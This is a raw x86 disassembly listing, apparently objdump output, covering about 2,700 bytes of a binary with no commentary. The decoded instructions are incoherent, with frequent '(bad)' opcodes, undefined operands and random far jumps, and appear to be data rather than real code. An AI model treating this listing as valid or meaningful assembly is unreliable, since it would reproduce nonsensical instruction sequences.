  414e98:	mov    esi,0x6126ad61
  414e9d:	cs inc esp
  414e9f:	and    al,0x10
  414ea1:	loop   0x414ef5
  414ea3:	jmp    0x414e55
  414ea5:	addr16 aas 
  414ea7:	add    DWORD PTR [ecx+0x5c],esi
  414eaa:	daa    
  414eab:	das    
  414eac:	cmp    eax,0x9258f3e2
  414eb1:	add    eax,0x2444df25
  414eb6:	(bad)  
  414eb7:	mov    dl,0x74
  414eb9:	in     al,dx
  414eba:	cli    
  414ebb:	push   eax
  414ebc:	and    al,0xe4
  414ebe:	call   0x6af1ce15
  414ec3:	mov    BYTE PTR [esi-0x4f],0x91
  414ec7:	jo     0x414f3a
  414ec9:	mov    dh,dl
  414ecb:	inc    ebp
  414ecc:	lock add DWORD PTR [edx+ebx*8-0x2557c77],ebp
  414ed4:	push   ss
  414ed5:	mov    WORD PTR [edx-0xcc8c3b4],gs
  414edb:	mov    bh,0xb5
  414edd:	mov    eax,0xb87c3d5
  414ee2:	cmp    eax,0x21ba210f
  414ee7:	icebp  
  414ee8:	or     eax,0xca25051b
  414eed:	ins    DWORD PTR es:[edi],dx
  414eee:	fmul   DWORD PTR [eax+0x5c]
  414ef1:	cmp    al,0x3
  414ef3:	add    ebp,DWORD PTR ds:0x8ca21db6
  414ef9:	or     eax,0xb8bf34b2
  414efe:	arpl   WORD PTR [eax+edi*1+0x24f53f39],di
  414f05:	jle    0x414ef3
  414f07:	lods   al,BYTE PTR ds:[esi]
  414f08:	sti    
  414f09:	adc    edx,esi
  414f0b:	adc    ch,BYTE PTR [edx+0xcd1454]
	...
  414f71:	add    BYTE PTR [eax],al
  414f73:	add    BYTE PTR [edi],dh
  414f75:	data16 xor al,0x9b
  414f78:	jne    0x414f55
  414f7a:	mov    edi,0xe45ae5ee
  414f7f:	call   0xdd08:0xc6f92afe
  414f86:	add    BYTE PTR [eax],al
  414f88:	add    al,0x1
  414f8a:	add    BYTE PTR [eax],al
  414f8c:	mov    edx,fs
  414f8e:	jnp    0x414f16
  414f90:	retf   0x49fb
  414f93:	xchg   esi,eax
  414f94:	cmp    eax,DWORD PTR [ebx+0x6ba06c38]
  414f9a:	scas   eax,DWORD PTR es:[edi]
  414f9b:	mov    dh,0x6
  414f9d:	push   es
  414f9e:	mov    edx,0x26f0e868
  414fa3:	dec    esi
  414fa4:	sub    DWORD PTR [ebx],0xede571a5
  414faa:	push   ds
  414fab:	rcl    DWORD PTR [ebx-0x3a],cl
  414fae:	das    
  414faf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414fb1:	dec    eax
  414fb2:	shr    DWORD PTR [eax-0x75ae5749],1
  414fb8:	and    dh,BYTE PTR [esi+0x7d]
  414fbb:	(bad)  
  414fbc:	jne    0x414f51
  414fbe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414fbf:	inc    eax
  414fc0:	jno    0x414f4b
  414fc2:	loope  0x415022
  414fc4:	inc    ebp
  414fc5:	jp     0x414f5e
  414fc7:	je     0x41500b
  414fc9:	xor    al,0xb9
  414fcb:	ret    0x152b
  414fce:	lahf   
  414fcf:	sub    cl,BYTE PTR [ecx+0x5]
  414fd2:	xchg   edi,eax
  414fd3:	mov    al,ds:0x87f16298
  414fd8:	enter  0xcf02,0xca
  414fdc:	ror    BYTE PTR [edi-0x53],0x46
  414fe0:	leave  
  414fe1:	dec    eax
  414fe2:	cmc    
  414fe3:	mov    esi,0x25ed1271
  414fe8:	mov    ?,WORD PTR [edx+0x27]
  414feb:	(bad)  [eax]
  414fed:	fisub  DWORD PTR [edx-0x1d]
  414ff0:	test   DWORD PTR [ecx-0x26089157],ecx
  414ff6:	add    BYTE PTR [ecx+edi*1+0x40489ea7],cl
  414ffd:	cmp    esp,edi
  414fff:	pop    esp
  415000:	outs   dx,BYTE PTR ds:[esi]
  415001:	or     edx,DWORD PTR [edx+eax*4-0x46]
  415005:	(bad)  
  415006:	out    0xd6,eax
  415008:	stc    
  415009:	cmp    BYTE PTR [ecx+0x6ec8434c],dh
  41500f:	jo     0x414fce
  415011:	loopne 0x415088
  415013:	fmul   QWORD PTR [ebp+ecx*8-0x23]
  415017:	or     eax,0x1b9f8193
  41501c:	push   ecx
  41501d:	loope  0x414fa5
  41501f:	or     ebp,DWORD PTR gs:[eax-0x1403e21f]
  415026:	dec    esi
  415027:	inc    ecx
  415028:	xchg   esp,eax
  415029:	push   edx
  41502a:	and    al,0xc4
  41502c:	mov    ecx,0xe47f753d
  415031:	sbb    BYTE PTR [eax-0x228470f5],dl
  415037:	dec    ebp
  415038:	mov    bh,0x8c
  41503a:	jnp    0x41504f
  41503c:	shr    esi,1
  41503e:	add    dl,BYTE PTR [edx]
  415040:	repz jbe 0x414fdc
  415043:	xchg   esp,eax
  415044:	sub    ebp,DWORD PTR fs:[edx+0x66]
  415048:	(bad)  
  415049:	mov    edi,0xc954b072
  41504e:	jecxz  0x415064
  415050:	jno    0x415085
  415052:	xor    edi,DWORD PTR [edi+0x3fc10591]
  415058:	and    esp,DWORD PTR [ecx+esi*4+0x3eb4ecc8]
  41505f:	adc    esp,esp
  415061:	add    edx,esp
  415063:	xlat   BYTE PTR ds:[ebx]
  415064:	xor    cl,dl
  415066:	out    dx,eax
  415067:	out    0x8e,al
  415069:	outs   dx,BYTE PTR ds:[esi]
  41506a:	mov    eax,ds:0x43b4fb5d
  41506f:	mov    ds:0xeee0ce2d,al
  415074:	cld    
  415075:	shl    BYTE PTR [esi-0x66],1
  415078:	popa   
  415079:	into   
  41507a:	pop    es
  41507b:	stos   DWORD PTR es:[edi],eax
  41507c:	mov    bh,0xd6
  41507e:	dec    ebx
  41507f:	add    al,0x1
  415081:	ins    BYTE PTR es:[edi],dx
  415082:	adc    eax,0xa0dfef8a
  415087:	and    DWORD PTR [eax],0x4
  41508a:	and    ch,BYTE PTR [ebx]
  41508c:	loope  0x4150ab
  41508e:	ds xchg esp,eax
	...
  4150f4:	jnp    0x4150f8
  4150f6:	add    ebp,ebx
  4150f8:	jnp    0x4150e5
  4150fa:	sti    
  4150fb:	xchg   edx,eax
  4150fc:	lahf   
  4150fd:	mov    esi,0x874fc2d
  415102:	cmp    ah,BYTE PTR [edi]
  415104:	or     al,0xde
  415106:	add    BYTE PTR [eax],al
  415108:	add    al,0x1
  41510a:	add    BYTE PTR [eax],al
  41510c:	fnstenv [ebp-0x75]
  41510f:	sub    ebp,DWORD PTR [ecx+0x39cbc3db]
  415115:	jl     0x4150c2
  415117:	cli    
  415118:	push   0x464996b6
  41511d:	sub    DWORD PTR [eax],ebx
  41511f:	pop    ebx
  415120:	cmp    al,0xeb
  415122:	jmp    0x2c0e:0x6b0bfe62
  415129:	or     edi,ebx
  41512b:	inc    eax
  41512c:	lods   eax,DWORD PTR ds:[esi]
  41512d:	loop   0x415100
  41512f:	mov    edi,0x1a40e96
  415134:	mov    eax,0xdc0d786d
  415139:	enter  0x385,0xb
  41513d:	and    al,0x28
  41513f:	jns    0x4150d5
  415141:	es out dx,al
  415143:	adc    eax,0x9eb33d3b
  415148:	xor    BYTE PTR [esi-0x12],ah
  41514b:	loope  0x415143
  41514d:	add    DWORD PTR [edi-0x4ba2caa1],esi
  415153:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415154:	fistp  QWORD PTR [edi]
  415156:	xor    al,0xe2
  415158:	inc    esp
  415159:	repnz mov al,ds:0xe5f9a7b5
  41515f:	repnz mov ds:0x35f2653a,al
  415165:	test   BYTE PTR [edi+ebp*1-0x6738a366],bh
  41516c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41516d:	and    eax,0xc2b1582d
  415172:	gs (bad) 
  415174:	mov    WORD PTR [edx+0x4e],ds
  415177:	xlat   BYTE PTR ds:[ebx]
  415178:	sub    al,0xe4
  41517a:	xor    ch,dh
  41517c:	and    al,0x5a
  41517e:	cmp    edx,edi
  415180:	xlat   BYTE PTR ds:[ebx]
  415181:	mov    ch,0x48
  415183:	push   esp
  415184:	xor    dh,BYTE PTR [eax-0x61542ab8]
  41518a:	xchg   esi,eax
  41518b:	push   ecx
  41518c:	inc    esp
  41518d:	pop    eax
  41518e:	push   ebx
  41518f:	mov    ?,WORD PTR [edi]
  415191:	or     al,al
  415193:	test   al,0xb2
  415195:	xchg   edx,eax
  415196:	mov    ch,0xfd
  415198:	mov    esp,0x4ee7d673
  41519d:	add    al,BYTE PTR [ebx+0x3e]
  4151a0:	icebp  
  4151a1:	nop
  4151a2:	pushf  
  4151a3:	leave  
  4151a4:	fcmovnb st,st(7)
  4151a6:	js     0x41517f
  4151a8:	jl     0x415155
  4151aa:	stos   DWORD PTR es:[edi],eax
  4151ab:	(bad)  
  4151ac:	fldenv [ebx]
  4151ae:	sar    BYTE PTR [esi-0xd],cl
  4151b1:	arpl   cx,dx
  4151b3:	push   ebx
  4151b4:	leave  
  4151b5:	push   esp
  4151b6:	adc    dl,BYTE PTR [edx]
  4151b8:	stos   BYTE PTR es:[edi],al
  4151b9:	inc    edx
  4151ba:	adc    BYTE PTR [ebx+0x47],bh
  4151bd:	imul   eax,esi,0x49
  4151c0:	call   0xf079:0x3b26badb
  4151c7:	inc    edi
  4151c8:	sub    eax,0xbb9394af
  4151cd:	mov    gs,WORD PTR [edx+0x45]
  4151d0:	outs   dx,DWORD PTR ds:[esi]
  4151d1:	mov    edx,0xa0aaaae0
  4151d6:	in     al,dx
  4151d7:	dec    esi
  4151d8:	or     al,0xf
  4151da:	es push esi
  4151dc:	sbb    al,0x61
  4151de:	dec    ebp
  4151df:	stos   BYTE PTR es:[edi],al
  4151e0:	mov    dh,0x57
  4151e2:	jg     0x415171
  4151e4:	loopne 0x415238
  4151e6:	sub    ah,dl
  4151e8:	ss daa 
  4151ea:	int    0x9e
  4151ec:	mov    eax,0xcc8a10d1
  4151f1:	dec    edi
  4151f2:	mov    ds:0xc515a75d,al
  4151f7:	xchg   bl,dl
  4151f9:	cmp    ah,dl
  4151fb:	pop    ss
  4151fc:	cmp    eax,0x8713657e
  415201:	and    al,0x27
  415203:	mov    edx,DWORD PTR [edi-0x3b]
  415206:	sub    ch,BYTE PTR [ebp+0x3d28a485]
  41520c:	dec    edi
  41520d:	mov    DWORD PTR [esi],ecx
  41520f:	sbb    BYTE PTR [eax],al
	...
  415271:	add    BYTE PTR [eax],al
  415273:	add    BYTE PTR [edi+edx*4],ch
  415276:	pop    ds
  415277:	sar    DWORD PTR [edi-0x6001127],1
  41527d:	(bad)  
  41527e:	mov    ecx,0xb7319e0b
  415283:	loop   0x415295
  415285:	fild   WORD PTR [eax]
  415287:	add    BYTE PTR [ecx+eax*1],al
  41528a:	add    BYTE PTR [eax],al
  41528c:	mov    ebp,DWORD PTR [eiz*1+0x142ff4d3]
  415293:	loop   0x415236
  415295:	pop    ebx
  415296:	jmp    0x7525646e
  41529b:	into   
  41529c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41529d:	jb     0x4152b2
  41529f:	in     al,0x99
  4152a1:	mov    eax,ds:0x2f7a2c5
  4152a6:	fbstp  TBYTE PTR [ebx-0x1527bfef]
  4152ac:	pop    edi
  4152ad:	retf   0xeb84
  4152b0:	(bad)  
  4152b1:	and    al,0xe9
  4152b3:	repz scas al,BYTE PTR es:[edi]
  4152b5:	add    ebx,DWORD PTR [eax+0xa]
  4152b8:	nop
  4152b9:	jp     0x415251
  4152bb:	scas   eax,DWORD PTR es:[edi]
  4152bc:	xchg   ebp,eax
  4152bd:	add    BYTE PTR [ecx+0x7d],0x85
  4152c1:	push   edx
  4152c3:	int    0x56
  4152c5:	sbb    dl,BYTE PTR [eax+0x9402f45]
  4152cb:	mov    BYTE PTR [edi],ch
  4152cd:	pusha  
  4152ce:	repnz enter 0xf43b,0x60
  4152d3:	es sub edx,esi
  4152d6:	and    DWORD PTR [eax-0x2b],esi
  4152d9:	adc    esp,0xffffffe7
  4152dc:	and    dl,BYTE PTR [ebp-0x61c3e2bd]
  4152e2:	in     al,0xe7
  4152e4:	jo     0x41535c
  4152e6:	scas   eax,DWORD PTR es:[edi]
  4152e7:	mov    edi,0xc6881b99
  4152ec:	ja     0x4152ee
  4152ee:	mov    al,0xbb
  4152f0:	xchg   ebx,eax
  4152f1:	push   edx
  4152f2:	leave  
  4152f3:	and    eax,0x88e9a03f
  4152f8:	mov    dh,0xde
  4152fa:	jecxz  0x41534c
  4152fc:	jecxz  0x415364
  4152fe:	out    0x75,al
  415300:	fstp   TBYTE PTR [esi-0xbc933c7]
  415306:	sbb    al,0x6f
  415308:	mov    esp,edx
  41530a:	jbe    0x41537a
  41530c:	sub    BYTE PTR [edi+0x71],al
  41530f:	cmp    al,0x43
  415311:	shl    DWORD PTR [ebx+edi*2-0x4b],1
  415315:	loope  0x41532e
  415317:	pop    ebx
  415318:	shl    cl,1
  41531a:	and    eax,0xa407af00
  41531f:	push   esi
  415320:	push   ss
  415321:	stos   BYTE PTR es:[edi],al
  415322:	add    al,0x57
  415324:	(bad)  
  415326:	out    dx,eax
  415327:	jno    0x415360
  415329:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41532a:	in     al,dx
  41532b:	xlat   BYTE PTR ds:[ebx]
  41532c:	ror    DWORD PTR [ebp-0x6363a7bf],cl
  415332:	shl    DWORD PTR [ebp+ecx*2+0x740c64ac],1
  415339:	mov    al,ds:0x885be57b
  41533e:	fcom   QWORD PTR [edx+0x37]
  415341:	add    edi,0xffffffe9
  415344:	mov    bl,0x63
  415346:	popa   
  415347:	push   es
  415348:	sub    bh,BYTE PTR [ebx-0x4e15c08c]
  41534e:	jg     0x41533d
  415350:	enter  0x6182,0x3
  415354:	aaa    
  415355:	sub    al,0xfe
  415357:	loop   0x4153cc
  415359:	fdivr  st(4),st
  41535b:	icebp  
  41535c:	mov    ecx,DWORD PTR [eax]
  41535e:	and    BYTE PTR [esi+0x71e8b01c],dl
  415364:	scas   eax,DWORD PTR es:[edi]
  415365:	aaa    
  415366:	inc    ecx
  415367:	mov    dl,0xbb
  415369:	nop
  41536a:	retf   
  41536b:	mov    esp,0xf800e4f3
  415370:	into   
  415371:	mov    bl,0xf
  415373:	sbb    BYTE PTR [edi+0x66],bl
  415376:	pop    ecx
  415377:	out    0xd0,eax
  415379:	mov    ds:0xd960d646,al
  41537e:	add    bl,ah
  415380:	mov    ch,0x9c
  415382:	mov    edi,ss
  415384:	sbb    eax,0x9265985b
  415389:	dec    edi
  41538a:	and    edi,0x789aafa7
	...
  4153f4:	ins    DWORD PTR es:[edi],dx
  4153f5:	lock repz jmp FWORD PTR cs:[edi]
  4153fa:	std    
  4153fb:	repz mov edi,0x6d3e5b0
  415401:	xchg   esp,eax
  415402:	push   es
  415403:	aas    
  415404:	adc    al,0xe0
  415406:	add    BYTE PTR [eax],al
  415408:	add    al,0x1
  41540a:	add    BYTE PTR [eax],al
  41540c:	pop    eax
  41540d:	loope  0x415463
  41540f:	test   DWORD PTR [esi+ebx*4],ebx
  415412:	cdq    
  415413:	xchg   edi,eax
  415414:	adc    DWORD PTR [eax+esi*1],0x308d9925
  41541b:	sub    ch,bh
  41541d:	js     0x415433
  41541f:	sub    al,0xc
  415421:	mov    al,ds:0x4664faea
  415426:	cdq    
  415427:	jmp    0xd1ee:0x28e58159
  41542e:	fnstenv [edx-0x77e24f5]
  415434:	loopne 0x4153cb
  415436:	inc    ecx
  415437:	xor    DWORD PTR [eax],esi
  415439:	pop    ecx
  41543a:	xchg   DWORD PTR ds:0x3dd6f046,eax
  415440:	lods   al,BYTE PTR ds:[esi]
  415441:	mov    dl,0xea
  415443:	adc    eax,0x2bac5bab
  415448:	adc    BYTE PTR [esi-0x2347300b],dh
  41544e:	not    BYTE PTR [esi]
  415450:	xchg   DWORD PTR [esi-0x6b],edi
  415453:	sub    ah,ch
  415455:	dec    edx
  415456:	loope  0x415419
  415458:	popa   
  415459:	adc    DWORD PTR [ebp+ecx*1+0x28],eax
  41545d:	dec    edi
  41545e:	push   edx
  41545f:	mov    esp,0xbba769e5
  415464:	push   0x72
  415466:	outs   dx,DWORD PTR ds:[esi]
  415467:	mov    DWORD PTR [eax+eax*2-0x2c],eax
  41546b:	pop    ebp
  41546c:	popa   
  41546d:	fiadd  WORD PTR [edx]
  41546f:	fsubr  DWORD PTR [esi-0x1a35035c]
  415475:	ret    
  415476:	ret    0xf846
  415479:	jp     0x4154e7
  41547b:	dec    DWORD PTR [esi+0x39e152f9]
  415481:	mov    eax,ds:0x1f85f0f2
  415486:	outs   dx,DWORD PTR ds:[esi]
  415487:	xlat   BYTE PTR ds:[ebx]
  415488:	outs   dx,DWORD PTR ds:[esi]
  415489:	shr    DWORD PTR [esi+0xd58a0f8],1
  41548f:	imul   ecx,DWORD PTR [edx-0x180446a8],0x5f285e87
  415499:	rol    DWORD PTR [ebp+0x55],1
  41549c:	push   edx
  41549d:	sub    ebx,ebx
  41549f:	call   0x55b5:0x34b47984
  4154a6:	sub    esp,DWORD PTR [esi-0x455d05ca]
  4154ac:	sbb    DWORD PTR [ecx+ecx*2+0x23],edx
  4154b0:	sti    
  4154b1:	pop    eax
  4154b2:	out    dx,eax
  4154b3:	inc    esp
  4154b4:	ins    BYTE PTR es:[edi],dx
  4154b5:	mov    ebx,0x2b64f7f6
  4154ba:	sbb    al,0x41
  4154bc:	das    
  4154bd:	xchg   ecx,eax
  4154be:	ror    BYTE PTR [ebp+0x10a99ad2],1
  4154c4:	dec    ecx
  4154c5:	dec    esi
  4154c6:	jmp    0x36a7:0x6fb7dc7f
  4154cd:	frstor ds:0xb1601a5d
  4154d3:	dec    esi
  4154d4:	sub    eax,0x338560a3
  4154d9:	out    0xcf,al
  4154db:	cmp    dh,BYTE PTR [ebp+0x59]
  4154de:	in     eax,0x22
  4154e0:	jmp    0x4154aa
  4154e2:	stos   BYTE PTR es:[edi],al
  4154e3:	std    
  4154e4:	lahf   
  4154e5:	sub    ebx,DWORD PTR [ecx-0x55]
  4154e8:	je     0x4154c9
  4154ea:	mov    eax,0xb34fb0d
  4154ef:	call   0x5bd20204
  4154f4:	(bad)  
  4154f5:	call   0x3d31:0x1bee1f8
  4154fc:	ins    BYTE PTR es:[edi],dx
  4154fd:	add    bl,BYTE PTR [ebx]
  4154ff:	push   es
  415500:	inc    ecx
  415501:	push   es
  415502:	mov    edi,0x742d3af
  415507:	mov    ds:0x1067e8f,eax
  41550c:	addr16 adc eax,0xb2c1
	...
  415572:	add    BYTE PTR [eax],al
  415574:	in     al,0xf0
  415576:	sub    DWORD PTR [edx],ecx
  415578:	cmp    eax,0xa2fee7db
  41557d:	arpl   WORD PTR [ebx],bp
  41557f:	je     0x41553e
  415581:	ja     0x4155f0
  415583:	in     al,dx
  415584:	sbb    cl,ah
  415586:	add    BYTE PTR [eax],al
  415588:	add    al,0x1
  41558a:	add    BYTE PTR [eax],al
  41558c:	mov    dh,0x1d
  41558e:	icebp  
  41558f:	sbb    bh,al
  415591:	std    
  415592:	adc    DWORD PTR [ecx+0x74],eax
  415595:	inc    ebx
  415596:	daa    
  415597:	push   edi
  415598:	jno    0x4155e3
  41559a:	mov    edi,0x37b7a325
  41559f:	dec    ecx
  4155a0:	fadd   DWORD PTR [ebp-0x3d047859]
  4155a6:	rcr    BYTE PTR fs:[ecx-0x26],1
  4155aa:	jno    0x415589
  4155ac:	push   esi
  4155ad:	int3   
  4155ae:	fstp   st(5)
  4155b0:	pushf  
  4155b1:	cmp    DWORD PTR ds:0x359f8647,ebx
  4155b7:	xchg   ebp,eax
  4155b8:	fs fs or bh,cl
  4155bc:	adc    eax,0x3f49a2b1
  4155c1:	data16 jle 0x415555
  4155c4:	cmp    eax,0xa355b6a6
  4155c9:	addr16 das 
  4155cb:	cmp    DWORD PTR [eax+0x8],eax
  4155ce:	adc    al,BYTE PTR [ebx+0x6f]
  4155d1:	enter  0x5500,0x9d
  4155d5:	or     eax,0x32313fda
  4155da:	adc    DWORD PTR [eax+ebx*4+0xa],esp
  4155de:	das    
  4155df:	enter  0xd4d,0x70
  4155e3:	aam    0x6d
  4155e5:	jno    0x4155f1
  4155e7:	mov    ecx,0x9d959871
  4155ec:	cmp    ebp,esp
  4155ee:	and    dh,bh
  4155f0:	mov    BYTE PTR [eax-0x28],ch
  4155f3:	jbe    0x41560f
  4155f5:	sub    DWORD PTR [ecx+edx*1-0x57],esp
  4155f9:	lea    ecx,[edi]
  4155fb:	mov    ah,0xe0
  4155fd:	push   ecx
  4155fe:	xchg   ebx,eax
  4155ff:	not    BYTE PTR [ebx-0x6]
  415602:	push   edi
  415603:	inc    ecx
  415604:	ins    DWORD PTR es:[edi],dx
  415605:	clc    
  415606:	pop    ecx
  415607:	arpl   WORD PTR [ebp-0xcf4eb9f],cx
  41560d:	or     al,0x7d
  41560f:	ds inc ebp
  415611:	das    
  415612:	sub    dh,ah
  415614:	sub    esi,0xcf37b6fa
  41561a:	xor    edx,edi
  41561c:	outs   dx,DWORD PTR ds:[esi]
  41561d:	cli    
  41561e:	loop   0x41565d
  415620:	lea    ebx,[ebp-0x40]
  415623:	xchg   ecx,eax
  415624:	jb     0x4155d9
  415626:	retf   
  415627:	adc    ecx,edx
  415629:	mov    al,0xf2
  41562b:	repz test eax,0x5a04427
  415631:	popf   
  415632:	or     DWORD PTR [ecx+ecx*1-0x15],0x43
  415637:	adc    DWORD PTR [edx+ebx*8+0x51],esp
  41563b:	clc    
  41563c:	inc    edi
  41563d:	push   ebx
  41563e:	div    DWORD PTR [eax-0x58]
  415641:	fninit 
  415643:	add    ebx,esi
  415645:	mov    dl,0xb9
  415647:	xchg   ecx,esp
  415649:	scas   eax,DWORD PTR es:[edi]
  41564a:	(bad)  
  41564b:	mov    cl,BYTE PTR ds:0xcc7eb895
  415651:	or     BYTE PTR [edx],bl
  415653:	sub    esi,DWORD PTR [edi]
  415655:	add    bh,BYTE PTR [eax+0x4350706c]
  41565b:	leave  
  41565c:	imul   edx,DWORD PTR [eax],0xfffffffc
  41565f:	icebp  
  415660:	ja     0x4156d2
  415662:	popa   
  415663:	lds    esp,FWORD PTR [eax]
  415665:	inc    esp
  415666:	push   edi
  415667:	or     dl,BYTE PTR [edx]
  415669:	cmp    eax,DWORD PTR [edx]
  41566b:	hlt    
  41566c:	push   cs
  41566d:	xchg   ebp,eax
  41566e:	jg     0x41566a
  415670:	loopne 0x4156c6
  415672:	and    al,0xd5
  415674:	retf   
  415675:	jno    0x4156b1
  415677:	push   cs
  415678:	push   esi
  415679:	fstp   TBYTE PTR [edi]
  41567b:	sti    
  41567c:	popa   
  41567d:	xchg   ah,dl
  41567f:	stos   BYTE PTR es:[edi],al
  415680:	cwde   
  415681:	mov    ds:0x757b6ad0,eax
  415686:	jecxz  0x4156b5
  415688:	mov    ds:0x41146bf,eax
  41568d:	mov    cl,0x9d
  41568f:	add    BYTE PTR es:[eax],al
	...
  4156f2:	add    BYTE PTR [eax],al
  4156f4:	ins    DWORD PTR es:[edi],dx
  4156f5:	call   0xbafd:0x67ff45bc
  4156fc:	mov    bl,0xba
  4156fe:	inc    esi
  4156ff:	sub    al,0xb4
  415701:	mov    es,WORD PTR [eax]
  415703:	mov    al,0x1c
  415705:	loop   0x415707
  415707:	add    BYTE PTR [ecx+eax*1],al
  41570a:	add    BYTE PTR [eax],al
  41570c:	stos   DWORD PTR es:[edi],eax
  41570d:	pop    edx
  41570e:	push   ebx
  41570f:	cmp    DWORD PTR [edi],0x14ebf989
  415715:	cmc    
  415716:	dec    ebp
  415717:	mov    ecx,0x698be3c9
  41571c:	int    0x1a
  41571e:	xor    ch,BYTE PTR [edx+0xc1816e5]
  415724:	shl    DWORD PTR [eax],1
  415726:	mov    ah,0xee
  415728:	sbb    ecx,edx
  41572a:	push   edx
  41572b:	push   ds
  41572c:	xor    bl,0x84
  41572f:	cdq    
  415730:	stc    
  415731:	imul   ecx,DWORD PTR [esi-0x6ff7496b],0xcb556c2d
  41573b:	(bad)  [esi+0x75f44f8d]
  415741:	mov    dl,BYTE PTR [ebx]
  415743:	cwde   
  415744:	push   ecx
  415745:	iret   
  415746:	sub    al,0x72
  415748:	push   eax
  415749:	mov    WORD PTR [eax+0x80d018c],?
  41574f:	fwait
  415750:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415751:	shl    BYTE PTR [edi+ebp*8],cl
  415754:	inc    ebx
  415755:	dec    eax
  415756:	add    al,0xb4
  415758:	sbb    DWORD PTR [edi+0x6d7e15f],0xffffffd8
  41575f:	inc    esp
  415760:	push   ecx
  415761:	mov    esp,0x4b127999
  415766:	inc    ecx
  415767:	fs pop ebx
  415769:	push   cs
  41576a:	std    
  41576b:	mov    ebx,0x87972260
  415770:	lods   al,BYTE PTR ds:[esi]
  415771:	pop    edi
  415772:	loopne 0x4157e9
  415774:	mov    cl,0xe2
  415776:	int3   
  415777:	(bad)  
  415778:	mov    al,0x70
  41577a:	add    esi,DWORD PTR [ebx+0x66]
  41577d:	lods   al,BYTE PTR ds:[esi]
  41577e:	out    dx,al
  41577f:	sbb    BYTE PTR [esi+eiz*4+0x7e],0xbe
  415784:	mov    edx,0xc8acda92
  415789:	mov    dl,ch
  41578b:	sub    eax,0x4715e2d8
  415790:	cmp    eax,0x58bda54
  415795:	and    al,0x28
  415797:	scas   eax,DWORD PTR es:[edi]
  415798:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415799:	jnp    0x4157a7
  41579b:	mov    cl,ch
  41579d:	mov    dl,0x40
  41579f:	lods   al,BYTE PTR ds:[esi]
  4157a0:	mov    eax,0x53e26783
  4157a5:	addr16 jg 0x41575d
  4157a8:	xchg   esp,eax
  4157a9:	scas   al,BYTE PTR es:[edi]
  4157aa:	xor    edx,DWORD PTR [edi+0x29]
  4157ad:	test   BYTE PTR [esi],bh
  4157af:	enter  0x7ed2,0xf9
  4157b3:	test   BYTE PTR [edx-0x60df4775],ch
  4157b9:	mov    dh,0x59
  4157bb:	pop    eax
  4157bc:	inc    esi
  4157bd:	jl     0x415822
  4157bf:	dec    edi
  4157c0:	add    DWORD PTR [esi],esp
  4157c2:	cmp    BYTE PTR ds:0x887d806a,al
  4157c8:	add    ecx,DWORD PTR [si]
  4157cb:	cli    
  4157cc:	das    
  4157cd:	sub    BYTE PTR fs:[ecx-0x78],bh
  4157d1:	(bad)  
  4157d2:	push   ebp
  4157d3:	mov    cl,0x2d
  4157d5:	popa   
  4157d6:	adc    BYTE PTR [edi],ah
  4157d8:	fidivr WORD PTR [esi]
  4157da:	es test eax,0x88de76b
  4157e0:	mov    ebp,0xf5ad93d5
  4157e5:	scas   al,BYTE PTR es:[edi]
  4157e6:	sti    
  4157e7:	das    
  4157e8:	xlat   BYTE PTR ds:[ebx]
  4157e9:	loope  0x4157f8
  4157eb:	and    eax,0xdd45fc99
  4157f0:	or     esp,ebp
  4157f2:	(bad)  
  4157f3:	adc    DWORD PTR [esi-0x3808d8fa],ecx
  4157f9:	jnp    0x41581e
  4157fb:	inc    esp
  4157fc:	jecxz  0x4157fc
  4157fe:	lods   eax,DWORD PTR ds:[esi]
  4157ff:	xchg   eax,esp
  415801:	add    al,0x19
  415803:	cmp    eax,DWORD PTR [edx-0x24229fb4]
  415809:	xchg   BYTE PTR [edx-0x68],ah
  41580c:	and    al,0x49
  41580e:	mov    esi,0x41
	...
  415873:	add    bl,cl
  415875:	(bad)  
  415876:	xchg   ebx,eax
  415877:	in     al,dx
  415878:	mov    bh,0xed
  41587a:	(bad)  
  41587b:	inc    DWORD PTR [edi]
  41587d:	(bad)  
  41587f:	sar    DWORD PTR [ecx],cl
  415881:	or     edx,ebx
  415883:	mov    ecx,0xe320
  415888:	add    al,0x1
  41588a:	add    BYTE PTR [eax],al
  41588c:	jnp    0x4158b1
  41588e:	sub    ebx,ebx
  415890:	dec    edi
  415891:	or     BYTE PTR [ebp-0x57],cl
  415894:	cmp    ebx,DWORD PTR [esi+0xf]
  415897:	scas   al,BYTE PTR es:[edi]
  415898:	test   BYTE PTR [edx+0x49],cl
  41589b:	stos   BYTE PTR es:[edi],al
  41589c:	mov    ch,0x93
  41589e:	enter  0xd7f,0xd1
  4158a2:	loope  0x41582c
  4158a4:	adc    esi,DWORD PTR [esi+0xc]
  4158a7:	adc    al,0xd
  4158a9:	pop    ds
  4158aa:	gs or  eax,0x2ed8205d
  4158b0:	aam    0x5
  4158b2:	aaa    
  4158b3:	add    BYTE PTR [ebp+0x48ede7ff],ch
  4158b9:	dec    edx
  4158ba:	jl     0x41588d
  4158bc:	fsubr  DWORD PTR [ebx+0x10]
  4158bf:	jge    0x415862
  4158c1:	pushf  
  4158c2:	or     dl,BYTE PTR [edi+0x4d1c6ecf]
  4158c8:	aad    0x93
  4158ca:	pop    DWORD PTR [esi]
  4158cc:	push   ds
  4158cd:	push   es
  4158ce:	popa   
  4158cf:	jg     0x415905
  4158d1:	xchg   ecx,eax
  4158d2:	fcomp  QWORD PTR [esi-0x516df622]
  4158d8:	push   eax
  4158d9:	inc    ecx
  4158da:	(bad)  
  4158db:	cmp    ecx,eax
  4158dd:	jl     0x415931
  4158df:	push   eax
  4158e0:	in     eax,dx
  4158e1:	mov    ebp,0xef7308b5
  4158e6:	mov    ds:0xce74bf9,al
  4158eb:	cmp    DWORD PTR ds:0xd76b2ffd,0x50
  4158f2:	adc    ecx,ebp
  4158f4:	loopne 0x41588d
  4158f6:	ja     0x415915
  4158f8:	sub    BYTE PTR [ebx],0x43
  4158fb:	loop   0x4158da
  4158fd:	or     DWORD PTR [edi+0x4],esp
  415900:	xchg   DWORD PTR [edi],ebx
  415902:	sbb    eax,0x87e553c4
  415907:	sub    DWORD PTR [eax+0x12],ebx
  41590a:	inc    edi
  41590b:	imul   esp,edi,0x12756d15
  415911:	jp     0x415947
